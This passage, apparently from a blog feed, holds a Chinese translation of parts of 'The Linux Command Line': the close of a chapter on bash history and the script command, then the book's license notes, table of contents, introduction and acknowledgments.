<p>历史扩展机制中有更多的元素可用，但这个主题已经相当深奥，如果继续讨论，我们可能会感到困惑。bash 手册页的 “HISTORY EXPANSION” 部分详细描述了所有细节。随意探索！</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>除了 bash 中的命令历史功能外，大多数 Linux 发行版还包括一个名为 script 的程序，用于记录整个 shell 会话并将其存储在文件中。命令的基本语法如下：</p>
<p>script [<em>文件</em>]</p>
<p>其中 <em>文件</em> 是用于存储录音的文件名。如果没有指定文件，将使用 typescript 文件。请参阅 script 手册页以获取程序的所有选项和功能的完整列表。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>在这一章中，我们介绍了 shell 提供的一些键盘技巧，以帮助热衷于打字的用户减少工作量。随着时间的推移和我们与命令行的更深入接触，我们可以回到这一章以获取更多的这些技巧。目前，您可以将它们视为可选的，并可能有助于您。</p>
<h4 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a><strong>进一步阅读</strong></h4><ul>
<li>Wikipedia 上有一篇关于计算机终端的好文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Db21wdXRlcl90ZXJtaW5hbA==">http://en.wikipedia.org/wiki/Computer_terminal<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令行</title>
    <url>/2024/03/the-linux-command-line/</url>
    <content><![CDATA[<h1 id="Linux-命令行"><a href="#Linux-命令行" class="headerlink" title="Linux 命令行"></a>Linux 命令行</h1><p>《Linux命令行》第五版，William Shotts著，一本LinuxCommand.org出版的书籍，版权 ©2008-2019，William E. Shotts, Jr. 本作品根据创作共用署名-非商业性使用-禁止演绎 3.0 美国许可证发布。要查看此许可证的副本，请访问上面的链接，或发送信件至 Creative Commons，PO Box 1866，Mountain View，CA 94042。该书的印刷版本由No Starch Press出版。可以在各大书店购买。</p>
<span id="more"></span>

<p>No Starch Press还提供流行电子阅读器的电子格式。您可以访问他们的网站：<a href="https://www.nostarch.com/"><span class="exturl" data-url="aHR0cHM6Ly93d3cubm9zdGFyY2guY29tLw==">https://www.nostarch.com<i class="fa fa-external-link-alt"></i></span></a> Linux®是Linus Torvalds的注册商标。所有其他商标均归其各自所有者所有。这本书是LinuxCommand.org项目的一部分，该项目致力于Linux教育和倡导，旨在帮助使用传统操作系统的用户迁移到未来。您可以在 <a href="http://linuxcommand.org/"><span class="exturl" data-url="aHR0cDovL2xpbnV4Y29tbWFuZC5vcmcv">http://linuxcommand.org<i class="fa fa-external-link-alt"></i></span></a> 上联系LinuxCommand.org项目。版本历史如下：</p>
<ul>
<li>版本 19.01A，2019年1月28日，第五版（已校正的目录）。</li>
<li>版本 19.01，2019年1月17日，第五版。</li>
<li>版本 17.10，2017年10月19日，第四版。</li>
<li>版本 16.07，2016年7月28日，第三版。</li>
<li>版本 13.07，2013年7月6日，第二版。</li>
<li>版本 09.12，2009年12月14日，第一版。</li>
</ul>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>为什么要使用命令行？<br>本书内容<br>适合阅读本书的人<br>本书内容概览<br>如何阅读本书<br>先决条件<br>为什么我不称其为“GNU&#x2F;Linux”<br>第五个互联网版中的新内容<br>致谢<br>第一个互联网版<br>第二个互联网版<br>第三个互联网版<br>第四个互联网版<br>第五个互联网版<br>需要您的反馈！<br>进一步阅读<br>版本信息</p>
<h2 id="第一部分-学习Shell"><a href="#第一部分-学习Shell" class="headerlink" title="第一部分 - 学习Shell"></a>第一部分 - 学习Shell</h2><h3 id="1-什么是Shell？"><a href="#1-什么是Shell？" class="headerlink" title="1 - 什么是Shell？"></a>1 - 什么是Shell？</h3><p>终端模拟器<br>输入您的第一个按键<br>命令历史记录<br>光标移动<br>关于鼠标和焦点的一些话<br>尝试一些简单的命令<br>结束终端会话<br>幕后的控制台<br>总结<br>进一步阅读</p>
<h3 id="2-导航"><a href="#2-导航" class="headerlink" title="2 - 导航"></a>2 - 导航</h3><p>理解文件系统</p>
<p>当前工作目录</p>
<p>列出目录内容</p>
<p>更改当前工作目录</p>
<p>绝对路径名</p>
<p>相对路径名</p>
<p>一些建议的快捷方式</p>
<p>有关文件名的重要事实</p>
<p>总结</p>
<h3 id="3-探索系统"><a href="#3-探索系统" class="headerlink" title="3 - 探索系统"></a>3 - 探索系统</h3><p>更多有趣的ls用法<br>选项和参数<br>更详细的长格式<br>使用file确定文件类型<br>使用less查看文件内容<br>什么是“文本”？<br>少即是多<br>进行一次引导之旅<br>符号链接<br>硬链接<br>总结<br>进一步阅读</p>
<h3 id="4-操作文件和目录"><a href="#4-操作文件和目录" class="headerlink" title="4 - 操作文件和目录"></a>4 - 操作文件和目录</h3><p>通配符<br>字符范围<br>通配符也适用于图形界面<br>mkdir - 创建目录<br>cp - 复制文件和目录<br>有用的选项和示例<br>mv - 移动和重命名文件<br>有用的选项和示例<br>rm - 删除文件和目录<br>有用的选项和示例<br>谨慎使用rm！<br>ln - 创建链接<br>硬链接<br>符号链接<br>让我们建立一个游乐场<br>创建目录<br>复制文件<br>移动和重命名文件<br>创建硬链接<br>创建符号链接<br>删除文件和目录<br>使用图形界面创建符号链接<br>总结</p>
<p>进一步阅读</p>
<h3 id="5-使用命令"><a href="#5-使用命令" class="headerlink" title="5 - 使用命令"></a>5 - 使用命令</h3><p>究竟什么是命令？<br>识别命令<br>type - 显示命令类型<br>which - 显示可执行文件的位置<br>获取命令的文档<br>help - 获取Shell内置命令的帮助<br>--help - 显示用法信息<br>man - 显示程序的手册页<br>apropos - 显示适当的命令<br>whatis - 显示一行手册页描述<br>其中最残酷的man手册页<br>info - 显示程序的信息条目<br>README和其他程序文档文件<br>使用别名创建自己的命令<br>总结<br>进一步阅读</p>
<h3 id="6-重定向"><a href="#6-重定向" class="headerlink" title="6 - 重定向"></a>6 - 重定向</h3><p>标准输入、输出和错误<br>重定向标准输出<br>重定向标准错误<br>将标准输出和标准错误重定向到一个文件<br>处理不需要的输出<br>在Unix文化中使用&#x2F;dev&#x2F;null<br>重定向标准输入<br>cat - 连接文件<br>管道</p>
<p>&gt; 和 | 之间的区别<br>过滤器<br>uniq - 报告或省略重复的行<br>wc - 打印行、字和字节计数<br>grep - 打印匹配模式的行<br>head &#x2F; tail - 打印文件的首部&#x2F;尾部<br>tee - 从标准输入读取并输出到标准输出和文件<br>总结<br>Linux是关于想象力的</p>
<h3 id="7-以Shell的视角看世界"><a href="#7-以Shell的视角看世界" class="headerlink" title="7 - 以Shell的视角看世界"></a>7 - 以Shell的视角看世界</h3><p>扩展<br>路径扩展<br>隐藏文件的路径扩展<br>波浪线扩展<br>算术扩展<br>花括号扩展<br>参数扩展<br>命令替代</p>
<p>引用<br>双引号<br>单引号<br>转义字符<br>反斜杠转义序列<br>总结<br>进一步阅读</p>
<h3 id="8-高级键盘技巧"><a href="#8-高级键盘技巧" class="headerlink" title="8 - 高级键盘技巧"></a>8 - 高级键盘技巧</h3><p>命令行编辑<br>光标移动<br>修改文本<br>剪切和粘贴（杀死和粘贴）文本<br>Meta键<br>完成<br>可编程完成<br>使用历史记录<br>搜索历史<br>历史扩展<br>script<br>总结<br>进一步阅读</p>
<h3 id="9-权限"><a href="#9-权限" class="headerlink" title="9 - 权限"></a>9 - 权限</h3><p>所有者、组成员和其他人<br>读、写和执行<br>chmod - 更改文件模式<br>八进制到底是什么？<br>使用图形界面设置文件模式<br>umask - 设置默认权限<br>一些特殊权限<br>更改身份<br>su - 使用替代用户和组ID运行Shell<br>sudo - 以其他用户身份执行命令<br>Ubuntu和sudo<br>chown - 更改文件所有者和组<br>chgrp - 更改组所有权<br>行使我们的特权<br>更改密码<br>总结<br>进一步阅读</p>
<h3 id="10-进程"><a href="#10-进程" class="headerlink" title="10 - 进程"></a>10 - 进程</h3><p>进程是如何工作的<br>查看进程<br>使用top动态查看进程<br>控制进程<br>中断进程<br>将进程置于后台<br>将进程恢复到前台<br>停止（暂停）进程<br>信号<br>使用kill发送信号给进程<br>使用killall向多个进程发送信号<br>关闭系统<br>更多与进程相关的命令<br>总结</p>
<h2 id="第二部分-配置和环境"><a href="#第二部分-配置和环境" class="headerlink" title="第二部分 - 配置和环境"></a>第二部分 - 配置和环境</h2><h3 id="11-环境"><a href="#11-环境" class="headerlink" title="11 - 环境"></a>11 - 环境</h3><p>环境中存储了什么？<br>检查环境<br>一些有趣的变量<br>环境是如何建立的？<br>启动文件中有什么？<br>修改环境<br>我们应该修改哪些文件？<br>文本编辑器<br>使用文本编辑器<br>为什么注释很重要<br>激活我们的更改<br>总结<br>进一步阅读</p>
<h3 id="12-vi的初步介绍"><a href="#12-vi的初步介绍" class="headerlink" title="12 - vi的初步介绍"></a>12 - vi的初步介绍</h3><p>为什么我们应该学习vi<br>一些背景<br>启动和停止vi<br>兼容性</p>
<p>模式<br>编辑模式<br>进入插入模式<br>保存我们的工作<br>移动光标<br>基本编辑<br>追加文本<br>打开一行<br>删除文本<br>剪切、复制和粘贴文本<br>连接行<br>查找和替换<br>在行内查找<br>在整个文件中查找<br>全局查找和替换<br>编辑多个文件<br>在文件之间切换<br>打开其他文件进行编辑<br>将内容从一个文件复制到另一个文件<br>将一个完整文件插入到另一个文件中<br>保存我们的工作<br>总结<br>进一步阅读</p>
<h3 id="13-自定义提示符"><a href="#13-自定义提示符" class="headerlink" title="13 - 自定义提示符"></a>13 - 自定义提示符</h3><p>提示符的解剖<br>尝试一些替代提示符设计<br>添加颜色<br>终端混乱<br>移动光标<br>保存提示符<br>总结<br>进一步阅读</p>
<h2 id="第三部分-常见任务和基本工具"><a href="#第三部分-常见任务和基本工具" class="headerlink" title="第三部分 - 常见任务和基本工具"></a>第三部分 - 常见任务和基本工具</h2><h3 id="14-软件包管理"><a href="#14-软件包管理" class="headerlink" title="14 - 软件包管理"></a>14 - 软件包管理</h3><p>打包系统<br>软件包系统的工作原理<br>软件包文件<br>仓库<br>依赖关系<br>高级和低级软件包工具<br>常见的软件包管理任务<br>在仓库中查找软件包<br>从仓库安装软件包<br>从软件包文件安装软件包<br>删除软件包<br>从仓库更新软件包<br>从软件包文件升级软件包<br>列出已安装的软件包<br>确定是否已安装软件包<br>显示有关已安装软件包的信息<br>找出哪个软件包安装了一个文件<br>总结<br>Linux软件安装的神话<br>进一步阅读</p>
<h3 id="15-存储介质"><a href="#15-存储介质" class="headerlink" title="15 - 存储介质"></a>15 - 存储介质</h3><p>挂载和卸载存储设备<br>查看已挂载文件系统的列表<br>为什么卸载很重要<br>确定设备名称<br>创建新文件系统<br>使用fdisk操作分区<br>使用mkfs创建新文件系统<br>测试和修复文件系统<br>fsck是什么？<br>直接在设备之间传输数据<br>创建CD-ROM映像<br>从CD-ROM中创建映像副本<br>从文件集合创建映像<br>换一个名字的程序<br>写CD-ROM映像<br>直接挂载ISO映像<br>擦写可重写CD-ROM<br>写入映像<br>总结<br>进一步阅读<br>额外的学分</p>
<h3 id="16-网络"><a href="#16-网络" class="headerlink" title="16 - 网络"></a>16 - 网络</h3><p>检查和监视网络<br>ping<br>traceroute<br>ip<br>netstat<br>通过网络传输文件<br>ftp<br>lftp - 更好的ftp<br>wget<br>与远程主机进行安全通信<br>ssh<br>使用SSH进行隧道通信<br>scp和sftp<br>Windows上的SSH客户端？<br>总结<br>进一步阅读</p>
<h3 id="17-搜索文件"><a href="#17-搜索文件" class="headerlink" title="17 - 搜索文件"></a>17 - 搜索文件</h3><p>locate - 轻松查找文件<br>locate数据库从何而来？<br>find - 艰难查找文件<br>测试<br>操作符<br>预定义操作<br>用户定义的操作<br>提高效率<br>xargs<br>处理有趣文件名<br>回到游乐场<br>选项<br>总结<br>进一步阅读</p>
<h3 id="18-存档和备份"><a href="#18-存档和备份" class="headerlink" title="18 - 存档和备份"></a>18 - 存档和备份</h3><p>压缩文件<br>gzip<br>bzip2<br>不要过度压缩<br>归档文件</p>
<p>tar<br>zip<br>同步文件和目录<br>使用rsync在网络上进行同步<br>总结<br>进一步阅读</p>
<h3 id="19-正则表达式"><a href="#19-正则表达式" class="headerlink" title="19 - 正则表达式"></a>19 - 正则表达式</h3><p>什么是正则表达式？<br>grep<br>元字符和字面量<br>任意字符<br>锚点<br>填字游戏助手<br>方括号表达式和字符类<br>否定<br>传统字符范围<br>POSIX字符类<br>恢复传统的排序顺序<br>POSIX基本正则表达式与扩展正则表达式<br>POSIX<br>交替<br>量词<br>? - 匹配零次或一次</p>
<p>* 匹配零次或多次</p>
<p>+ 匹配一次或多次<br>{ } - 匹配指定次数的元素<br>将正则表达式投入使用<br>使用grep验证电话列表<br>使用find查找丑陋的文件名<br>使用locate搜索文件<br>使用less和vim搜索文本<br>总结<br>进一步阅读</p>
<h3 id="20-文本处理"><a href="#20-文本处理" class="headerlink" title="20 - 文本处理"></a>20 - 文本处理</h3><p>文本的应用<br>文档<br>网页<br>电子邮件<br>打印机输出<br>程序源代码<br>重新访问一些老朋友<br>cat<br>MS-DOS文本与Unix文本<br>sort<br>uniq<br>切分和切片</p>
<p>cut<br>扩展制表符<br>paste<br>join<br>比较文本<br>comm<br>diff<br>patch<br>即时编辑<br>tr<br>ROT13：不太秘密的解码器<br>sed<br>喜欢sed的人还喜欢<br>aspell<br>总结<br>进一步阅读<br>额外学分</p>
<h3 id="21-格式化输出"><a href="#21-格式化输出" class="headerlink" title="21 - 格式化输出"></a>21 - 格式化输出</h3><p>简单的格式化工具<br>nl - 编号行<br>fold - 将每行包装到指定长度<br>fmt - 简单的文本格式化工具<br>pr - 为打印格式化文本<br>printf - 格式化和打印数据<br>文档格式化系统<br>groff<br>总结<br>进一步阅读</p>
<h3 id="22-打印"><a href="#22-打印" class="headerlink" title="22 - 打印"></a>22 - 打印</h3><p>打印的简要历史<br>在昏暗时代的打印<br>基于字符的打印机<br>图形打印机<br>在Linux中打印<br>为打印准备文件<br>pr - 将文本文件转换为打印格式<br>将打印作业发送到打印机<br>lpr - 打印文件（伯克利风格）<br>lp - 打印文件（System V 风格）<br>另一个选项：a2ps<br>监视和控制打印作业<br>lpstat - 显示打印系统状态<br>lpq - 显示打印队列状态<br>lprm &#x2F; cancel - 取消打印作业<br>总结<br>进一步阅读</p>
<h3 id="23-编译程序"><a href="#23-编译程序" class="headerlink" title="23 - 编译程序"></a>23 - 编译程序</h3><p>什么是编译？<br>所有程序都是编译的吗？<br>编译C程序<br>获取源代码<br>检查源树<br>构建程序<br>安装程序<br>总结<br>进一步阅读</p>
<h2 id="第四部分-编写Shell脚本"><a href="#第四部分-编写Shell脚本" class="headerlink" title="第四部分 - 编写Shell脚本"></a>第四部分 - 编写Shell脚本</h2><h3 id="24-编写您的第一个脚本"><a href="#24-编写您的第一个脚本" class="headerlink" title="24 - 编写您的第一个脚本"></a>24 - 编写您的第一个脚本</h3><p>什么是Shell脚本？<br>如何编写Shell脚本<br>脚本文件格式<br>可执行权限<br>脚本文件位置<br>脚本的良好位置<br>更多格式技巧<br>长选项名称<br>缩进和行续行<br>为脚本编写配置vim<br>总结<br>进一步阅读</p>
<h3 id="25-启动项目"><a href="#25-启动项目" class="headerlink" title="25 - 启动项目"></a>25 - 启动项目</h3><p>第一阶段：最小文档<br>第二阶段：添加一些数据<br>变量和常量<br>为变量和常量分配值<br>文档<br>总结<br>进一步阅读</p>
<h3 id="26-自顶向下设计"><a href="#26-自顶向下设计" class="headerlink" title="26 - 自顶向下设计"></a>26 - 自顶向下设计</h3><p>Shell函数<br>局部变量<br>保持脚本运行<br>在.bashrc文件中使用Shell函数<br>总结<br>进一步阅读</p>
<h3 id="27-流程控制：使用if进行分支"><a href="#27-流程控制：使用if进行分支" class="headerlink" title="27 - 流程控制：使用if进行分支"></a>27 - 流程控制：使用if进行分支</h3><p>if<br>退出状态<br>test<br>文件表达式<br>字符串表达式<br>整数表达式<br>test的一个更现代版本<br>(( )) - 针对整数设计<br>组合表达式<br>可移植性是小人心灵的麻烦<br>控制操作符：另一种分支方式<br>总结<br>进一步阅读</p>
<h3 id="28-读取键盘输入"><a href="#28-读取键盘输入" class="headerlink" title="28 - 读取键盘输入"></a>28 - 读取键盘输入</h3><p>read – 从标准输入读取值<br>选项<br>IFS<br>不能使用管道进行读取<br>验证输入<br>菜单<br>总结<br>额外学分<br>进一步阅读</p>
<h3 id="29-流程控制：使用while-until进行循环"><a href="#29-流程控制：使用while-until进行循环" class="headerlink" title="29 - 流程控制：使用while &#x2F; until进行循环"></a>29 - 流程控制：使用while &#x2F; until进行循环</h3><p>循环<br>while<br>中断循环<br>until<br>使用循环读取文件<br>总结<br>进一步阅读</p>
<h3 id="30-故障排除"><a href="#30-故障排除" class="headerlink" title="30 - 故障排除"></a>30 - 故障排除</h3><p>语法错误<br>丢失引号<br>丢失或意外令牌<br>意外扩展<br>逻辑错误<br>防御性编程<br>注意文件名<br>便携式文件名<br>验证输入<br>设计是时间的函数<br>测试<br>测试用例<br>调试<br>找到问题区域<br>跟踪<br>在执行过程中检查值<br>总结<br>进一步阅读</p>
<h3 id="31-流程控制：使用case进行分支"><a href="#31-流程控制：使用case进行分支" class="headerlink" title="31 - 流程控制：使用case进行分支"></a>31 - 流程控制：使用case进行分支</h3><p>case<br>模式<br>执行多个操作<br>总结<br>进一步阅读</p>
<h3 id="32-位置参数"><a href="#32-位置参数" class="headerlink" title="32 - 位置参数"></a>32 - 位置参数</h3><p>访问命令行<br>确定参数的数量<br>shift – 获取多个参数的访问权限<br>简单应用<br>在Shell函数中使用位置参数<br>大规模处理位置参数<br>一个更完整的应用<br>总结<br>进一步阅读</p>
<h3 id="33-流程控制：使用for进行循环"><a href="#33-流程控制：使用for进行循环" class="headerlink" title="33 - 流程控制：使用for进行循环"></a>33 - 流程控制：使用for进行循环</h3><p>for：传统的Shell形式<br>为什么是i？<br>for：C语言形式<br>总结<br>进一步阅读</p>
<h3 id="34-字符串和数字"><a href="#34-字符串和数字" class="headerlink" title="34 - 字符串和数字"></a>34 - 字符串和数字</h3><p>参数扩展<br>基本参数<br>扩展以管理空变量<br>返回变量名的扩展<br>字符串操作<br>大小写转换<br>算术运算和扩展<br>数字基数<br>一元操作符<br>简单的算术<br>赋值<br>位运算<br>逻辑运算<br>bc – 一个任意精度计算语言<br>使用bc<br>示例脚本<br>总结<br>额外学分<br>进一步阅读</p>
<h3 id="35-数组"><a href="#35-数组" class="headerlink" title="35 - 数组"></a>35 - 数组</h3><p>什么是数组？<br>创建数组<br>为数组分配值<br>访问数组元素<br>数组操作<br>输出数组的全部内容<br>确定数组元素的数量<br>找到数组使用的下标<br>在数组的末尾添加元素<br>对数组进行排序<br>删除数组<br>关联数组<br>总结<br>进一步阅读</p>
<h3 id="36-稀有事物"><a href="#36-稀有事物" class="headerlink" title="36 - 稀有事物"></a>36 - 稀有事物</h3><p>组命令和子shell<br>进程替代<br>陷阱<br>临时文件<br>异步执行<br>等待<br>命名管道<br>设置命名管道<br>使用命名管道<br>总结<br>进一步阅读<br>索引</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我想给你讲一个故事。</p>
<p>不，不是1991年Linus Torvalds写下Linux内核的故事。你可以在很多Linux的书中读到这个故事。我也不会告诉你，几年前，Richard Stallman开始GNU项目以创建自由的类Unix操作系统的故事。这也是一个重要的故事，但大多数其他Linux的书也有提到。</p>
<p>不，我想告诉你的是如何重新夺回你对计算机的控制权的故事。</p>
<p>当我在20世纪70年代末成为大学生并开始使用计算机时，一场革命正在进行。微处理器的发明使我们这些普通人，像你和我一样，有可能真的拥有一台计算机。对于今天的许多人来说，很难想象当时的世界是什么样子，当时只有大企业和政府运行所有的计算机。简而言之，你几乎什么都做不了。</p>
<p>今天，世界变得截然不同。计算机随处可见，从小小的手表到巨大的数据中心再到中间的一切。除了无处不在的计算机，我们还有一个将它们连接在一起的无处不在的网络。这创造了一个奇妙的新时代，个人获得了更多的权力和创造自由，但在过去的几十年里，还发生了一些其他的事情。一些巨头公司一直在对大多数世界的计算机施加控制，并决定你可以做什么，不能做什么。幸运的是，来自世界各地的人们正在采取行动。他们通过编写自己的软件来努力保持对计算机的控制。他们正在构建Linux。</p>
<p>许多人在谈论Linux时谈到“自由”，但我认为大多数人并不知道这种自由真正意味着什么。自由是决定计算机做什么的力量，而拥有这种自由的唯一方式就是知道计算机正在做什么。自由是一台没有秘密的计算机，一台如果你足够关心，就可以了解一切的计算机。</p>
<p><strong>为什么使用命令行？</strong></p>
<p>你是否曾经注意到电影中的“超级黑客”，你知道的，那个可以在不到30秒的时间内侵入超安全军事计算机的家伙，他从不触摸鼠标？这是因为电影制片人意识到我们作为人类的本能，真正在计算机上完成任何事情的唯一方法是通过键盘输入！</p>
<p>今天，大多数计算机用户只熟悉<em>图形用户界面</em>（GUI），并且已经被供应商和权威人士教导说<em>命令行界面</em>（CLI）是过去可怕的东西。这很不幸，因为一个好的命令行界面是与计算机沟通的一种奇妙的表达方式，就像书面文字对人类而言一样。有人说“图形用户界面使易事易，而命令行界面使困难的任务成为可能”，这在今天仍然是非常正确的。</p>
<p>由于Linux是按照Unix操作系统家族的模型设计的，因此它与Unix共享相同丰富的命令行工具遗产。Unix在20世纪80年代初崭露头角（尽管在此之前的十年里首次开发），在广泛采用图形用户界面之前就崭露头角，因此开发了一个广泛的命令行界面。事实上，早期选择Linux而不是Windows NT的采用者之一的最有力的原因是其强大的命令行界面，使“困难的任务成为可能”。</p>
<h2 id="本书内容"><a href="#本书内容" class="headerlink" title="本书内容"></a>本书内容</h2><p>这本书是对“生活”在Linux命令行上的广泛概述。与一些只专注于单个程序（如bash shell程序）的书籍不同，这本书将尝试传达如何更全面地使用命令行界面。它是如何工作的？它能做什么？最好的使用方式是什么？</p>
<p>**这不是一本关于Linux系统管理的书。**尽管任何关于命令行的讨论都不可避免地会涉及系统管理话题，但这本书只涉及了一些管理问题。然而，它将通过提供对命令行的使用打下坚实基础，为读者进行额外学习做好准备，这是任何严肃的系统管理任务所必需的工具。</p>
<p>**这本书非常侧重于Linux。**许多其他的书籍试图通过包含通用Unix和macOS等其他平台来扩大吸引力。这样一来，它们就“淡化”了它们的内容，只包含一般性的主题。与此不同，这本书只涵盖当代的Linux发行版。95%的内容对其他类Unix系统的用户也有用，但这本书主要针对现代Linux命令行用户。</p>
<h2 id="谁应该读这本书"><a href="#谁应该读这本书" class="headerlink" title="谁应该读这本书"></a>谁应该读这本书</h2><p>这本书适合那些刚刚从其他平台迁移到Linux的新用户。很可能你是某个版本的Microsoft Windows的“高级用户”。也许你的老板告诉你要管理一个Linux服务器，或者你正在进入像树莓派这样的单板计算机（SBC）的新世界。你可能只是一个厌倦了所有安全问题并想尝试Linux的桌面用户。没问题，所有人都受欢迎。</p>
<p>话虽如此，通向Linux启示的道路并没有捷径。学习命令行是具有挑战性并需要真正的努力的事情。问题并不是因为它太难，而是因为它太 <em>广泛</em> 了。平均的Linux系统上实际上有 <em>成千上万</em> 个可以在命令行上使用的程序。请注意，学习命令行并不是一项轻松的事业。</p>
<p>另一方面，学习Linux命令行是非常有益的。如果你现在认为自己是一个“高级用户”，请等一等。你还不知道什么是真正的力量。而且，与许多其他计算机技能不同，对命令行的了解具有长期效益。今天学到的技能在10年后仍然会很有用。命令行经受住了时间的考验。</p>
<p>还假定你没有编程经验，但不用担心，我们也会开始让你朝这个方向迈进。</p>
<h2 id="本书内容-1"><a href="#本书内容-1" class="headerlink" title="本书内容"></a>本书内容</h2><p>这些材料是按照精心选择的顺序呈现的，就像一个导师坐在你旁边引导你一样。许多作者以一种“系统性”的方式处理这些材料，按顺序详尽地涵盖每个主题。从作者的角度来看，这是有道理的，但对新用户来说可能非常令人困惑。</p>
<p>另一个目标是让你熟悉Unix的思维方式，这与Windows的思维方式不同。在此过程中，我们将进行一些旁观，帮助你理解为什么某些事物的工作方式以及它们是如何变成那样的。Linux不仅仅是一款软件；它还是更大的Unix文化的一部分，具有自己的语言和历史。我可能也会加入一两篇吐槽。</p>
<p>本书分为四个部分，每个部分涵盖命令行体验的某个方面：</p>
<ul>
<li><p><strong>第一部分 - 学习Shell</strong> 开始我们对命令行基本语言的探索，包括命令的结构、文件系统导航、命令行编辑以及查找命令的帮助和文档。</p>
</li>
<li><p><strong>第二部分 - 配置与环境</strong> 包括编辑控制计算机从命令行操作的配置文件。</p>
</li>
<li><p><strong>第三部分 - 常见任务与基本工具</strong> 探讨了许多通常从命令行执行的普通任务。类Unix操作系统，如Linux，包含许多用于对数据执行强大操作的“经典”命令行程序。</p>
</li>
<li><p><strong>第四部分 - 编写Shell脚本</strong> 介绍了shell编程，这是一种确实很基础但易学的自动化许多常见计算任务的技术。通过学习shell编程，你将熟悉可应用于许多其他编程语言的概念。</p>
</li>
</ul>
<h2 id="如何阅读本书"><a href="#如何阅读本书" class="headerlink" title="如何阅读本书"></a>如何阅读本书</h2><p>从本书的开头开始，一直读到结尾。这不是一本参考书，更像是一个有开头、中间和结尾的故事。</p>
<h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>要使用这本书，你只需要一个正常运行的Linux系统。你可以通过以下两种方式之一获得它：</p>
<ol>
<li><p><strong>在一台（不太新的）计算机上安装Linux。</strong> 选择哪个发行版都无关紧要，尽管今天大多数人都从Ubuntu、Fedora或OpenSUSE开始。如果不确定，先试试Ubuntu。安装现代Linux发行版可能非常简单，也可能非常困难，这取决于你的硬件。建议选择一台几年前的桌面计算机，至少有2 GB的RAM和6 GB的可用硬盘空间。尽量避免使用笔记本电脑和无线网络，因为这些通常更难设置。</p>
</li>
<li><p><strong>使用“Live CD”或USB闪存驱动器。</strong> 许多Linux发行版的一个很酷的功能是，你可以直接从CDROM或USB闪存驱动器运行它们，而无需进行安装。只需进入BIOS设置，将计算机设置为从CDROM驱动器或USB设备启动，然后重新启动。使用这种方法是在安装之前测试计算机是否兼容Linux的好方法。缺点是与在硬盘上安装Linux相比，速度可能非常慢。Ubuntu和Fedora（等等）都有Live版本。</p>
</li>
</ol>
<p>无论你如何安装Linux，你都需要偶尔使用超级用户（即管理员）权限来执行本书中的教程。</p>
<p>安装好系统后，开始阅读并跟着本书进行操作。本书的大部分内容都是“动手操作”的，所以坐下来动手吧！</p>
<h2 id="为什么我不称其为“GNU-Linux”"><a href="#为什么我不称其为“GNU-Linux”" class="headerlink" title="为什么我不称其为“GNU&#x2F;Linux”"></a>为什么我不称其为“GNU&#x2F;Linux”</h2><p>在一些领域，将Linux操作系统称为“GNU&#x2F;Linux操作系统”是政治上正确的。问题在于“Linux”没有完全正确的命名方式，因为它是由许多不同的人在一个庞大的分布式开发工作中编写的。从技术上讲，Linux只是操作系统内核的名字，不仅此而已。内核当然非常重要，因为它使操作系统运行，但它不足以构成一个完整的操作系统。</p>
<p>理查德·斯托曼（Richard Stallman）登场了，这位创始人自由软件运动的天才哲学家，创建了自由软件基金会，启动了GNU项目，编写了GNU C编译器（gcc）的第一个版本，创建了GNU通用公共许可证（GPL），等等，等等。他 <em>坚持</em> 让你称其为“GNU&#x2F;Linux”以正确反映GNU项目的贡献。虽然GNU项目的时间早于Linux内核，并且该项目的贡献非常值得认可，但将它们放在名字中对那些也做出了重要贡献的其他人来说是不公平的。此外，我认为“Linux&#x2F;GNU”更为技术上准确，因为内核首先启动，然后其他所有东西都在其上运行。</p>
<p>在普及的用法中，“Linux”指的是内核以及在典型Linux发行版中找到的所有其他自由和开源软件，也就是整个Linux生态系统，不仅仅是GNU组件。操作系统市场似乎更喜欢像DOS、Windows、macOS、Solaris、Irix和AIX这样的单词名称。我选择使用流行的格式。然而，如果你更喜欢使用“GNU&#x2F;Linux”，请在阅读本书时进行心理搜索和替换。我不会介意。</p>
<h2 id="第五个网络版本的新内容"><a href="#第五个网络版本的新内容" class="headerlink" title="第五个网络版本的新内容"></a>第五个网络版本的新内容</h2><p>在第四个网络版本的基础上，这个版本的《Linux命令行》进行了广泛的现代化。进行了许多小的编辑和更正，添加了新的截图和图表，以及一些澄清。我还修复了一些错误 ;-）。</p>
<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>我要感谢以下人士，他们帮助使这本书成为可能：</p>
<h3 id="第一个网络版本"><a href="#第一个网络版本" class="headerlink" title="第一个网络版本"></a>第一个网络版本</h3><p>Jenny Watson，Wiley Publishing的收购编辑，最初建议我写一本关于shell脚本的书。</p>
<p>John C. Dvorak，著名的专栏作家和评论家。在他的视频播客“Cranky Geeks”的一集中，Dvorak先生描述了写作的过程：“地狱。每天写200个字，一年后你就有一部小说了。” 这个建议启发我每天写一页，直到我有了一本书。</p>
<p>Dmitri Popov在Free Software Magazine上发表了一篇名为“使用Writer创建书籍模板”的文章，这启发我使用OpenOffice.org Writer来撰写文本。事实证明，它运作得非常好。</p>
<p>Mark Polesky对文本进行了非凡的审查和测试。</p>
<p>Jesse Becker、Tomasz Chrzczonowicz、Michael Levin和Spence Miner也对文本的部分进行了测试和审查。</p>
<p>Karen M. Shotts通过编辑手稿为我润色了许多小时，提升了我的所谓英语水平。</p>
<h3 id="第二个网络版本"><a href="#第二个网络版本" class="headerlink" title="第二个网络版本"></a>第二个网络版本</h3><p>特别感谢以下个人，他们提供的宝贵反馈被纳入第二个网络版本中：Adrian Arpidez、Hu Bo、Heriberto Cantú、Joshua Escamilla、Bruce Fowler、Ma Jun、Seth King、Mike O’Donnell、Parviz Rasoulipour、Gabriel Stutzman和Christian Wuethrich。</p>
